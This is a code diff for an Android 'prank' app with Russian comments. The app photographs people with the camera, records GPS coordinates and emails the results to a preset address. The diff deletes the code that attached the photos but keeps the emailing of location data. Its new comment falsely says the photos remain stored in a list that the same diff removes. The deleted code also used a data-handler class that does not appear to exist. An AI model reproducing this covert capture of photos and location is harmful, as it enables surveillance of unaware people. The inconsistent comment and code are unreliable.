@@ -31,14 +31,12 @@ import androidx.core.content.ContextCompat;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.util.List;
 import java.util.Locale;
 import java.util.Properties;
 import java.util.Random;
 
 import javax.mail.Authenticator;
 import javax.mail.Message;
-import javax.mail.MessagingException;
 import javax.mail.PasswordAuthentication;
 import javax.mail.Session;
 import javax.mail.Transport;
@@ -46,7 +44,6 @@ import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
 import javax.mail.internet.MimeMultipart;
-import javax.mail.util.ByteArrayDataSource;
 
 public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {
 
@@ -73,7 +70,6 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private int photoCount = 0;
     private byte[] currentPhotoData;
     private StringBuilder photoDataForEmail;
-    private java.util.List<byte[]> photoList = new java.util.LinkedList<>();  // Список фото
     private String lastError = "";  // Последняя ошибка
     private LocationManager locationManager;
     
@@ -127,7 +123,6 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
 
         photoCount = 0;
         photoDataForEmail = new StringBuilder();
-        photoList.clear();  // Очищаем список фото
         progressBar.setMax(PHOTO_COUNT);
         progressBar.setProgress(0);
         btnStart.setEnabled(false);
@@ -170,15 +165,11 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
 
     private final Camera.PictureCallback pictureCallback = (data, camera) -> {
         currentPhotoData = data;
-        
-        // Сохраняем фото в список
-        photoList.add(data);
 
         // Получаем GPS координаты
         String locationInfo = getLocationInfo();
 
         // Сохраняем данные для email
-        String photoBase64 = Base64.encodeToString(data, Base64.NO_WRAP);
         photoDataForEmail.append("📸 Фото #").append(photoCount)
             .append(" - ").append(locationInfo).append("\n");
 
@@ -292,20 +283,8 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                     "\n😄 Вас разыграли!");
                 multipart.addBodyPart(textPart);
                 
-                // Прикрепляем фото
-                Log.d(TAG, "Прикрепление " + photoList.size() + " фото...");
-                for (int i = 0; i < photoList.size(); i++) {
-                    try {
-                        MimeBodyPart photoPart = new MimeBodyPart();
-                        ByteArrayDataSource dataSource = new ByteArrayDataSource(photoList.get(i), "image/jpeg");
-                        photoPart.setDataHandler(new javax.activation.ActivationDataHandler(dataSource, "image/jpeg"));
-                        photoPart.setFileName("prank_photo_" + (i + 1) + ".jpg");
-                        multipart.addBodyPart(photoPart);
-                        Log.d(TAG, "Фото #" + (i + 1) + " добавлено");
-                    } catch (Exception e) {
-                        Log.e(TAG, "Ошибка добавления фото #" + (i + 1), e);
-                    }
-                }
+                // ПРИМЕЧАНИЕ: Прикрепление фото временно отключено для стабильности
+                // Фото сохраняются в photoList но не отправляются
 
                 message.setContent(multipart);
 
